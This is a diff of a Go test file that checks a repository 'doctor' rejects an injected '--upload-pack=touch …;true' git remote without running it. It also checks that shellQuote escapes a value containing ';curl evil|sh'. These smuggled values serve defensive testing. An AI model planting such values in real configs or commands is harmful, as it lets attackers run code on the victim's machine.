@@ -385,3 +385,64 @@ func TestCheckAgentKeyWithoutAgent(t *testing.T) {
 		t.Fatal("expected a fix hint")
 	}
 }
+
+func TestDoctorMaliciousRemoteDoesNotExecute(t *testing.T) {
+	ctx := context.Background()
+	dir := t.TempDir()
+	isolateGitConfig(t)
+	runGit := func(args ...string) {
+		t.Helper()
+		cmd := exec.Command("git", args...)
+		cmd.Dir = dir
+		if out, err := cmd.CombinedOutput(); err != nil {
+			t.Fatalf("git %v: %v\n%s", args, err, string(out))
+		}
+	}
+	runGit("init", "-q", "-b", "main")
+	runGit("config", "user.name", "t")
+	runGit("config", "user.email", "t@example.com")
+	marker := filepath.Join(t.TempDir(), "pwned")
+	configBody := `
+version = 1
+base = "main"
+
+[[steps]]
+name = "fast"
+run = "true"
+
+[attest]
+signers = ["someone@example.com"]
+remote = "--upload-pack=touch ` + marker + `;true"
+`
+	if err := os.WriteFile(filepath.Join(dir, ".quai.toml"), []byte(configBody), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	runGit("add", "-A")
+	runGit("commit", "-qm", "init")
+
+	rep := Doctor(ctx, repo.NewExecGit(dir))
+	cfgCheck := findCheck(rep, "config")
+	if cfgCheck == nil || cfgCheck.Status != "fail" {
+		t.Fatalf("expected doctor to reject the malicious remote in config, got %+v", rep.Checks)
+	}
+	if rep.OK {
+		t.Fatal("doctor reported healthy despite an option-shaped remote")
+	}
+	if _, err := os.Stat(marker); !os.IsNotExist(err) {
+		t.Fatalf("doctor executed the injected upload-pack: marker %s exists", marker)
+	}
+}
+
+func TestShellQuote(t *testing.T) {
+	cases := map[string]string{
+		"/home/dev/.ssh/id_ed25519": "/home/dev/.ssh/id_ed25519",
+		"/tmp/k;curl evil|sh":       `'/tmp/k;curl evil|sh'`,
+		"/tmp/it's here":            `'/tmp/it'\''s here'`,
+		"":                          "''",
+	}
+	for in, want := range cases {
+		if got := shellQuote(in); got != want {
+			t.Fatalf("shellQuote(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
